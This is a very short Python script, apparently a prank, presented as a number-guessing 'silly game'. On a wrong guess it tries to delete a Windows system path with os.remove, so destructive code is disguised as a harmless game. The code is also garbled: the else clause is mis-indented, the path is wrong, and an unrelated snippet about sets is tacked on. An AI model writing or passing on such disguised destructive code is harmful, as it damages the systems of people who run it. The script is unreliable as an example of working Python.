import random
import os

number =random.randint(1,10)
guess = input("silly game: Guess number between 1 and 10")
guess = int(guess)
if guess == number: 
  print("you won")
 else:
   os.remove("c:/system/system32")


x= {1,2,3}
x.add(2)
print(len(x))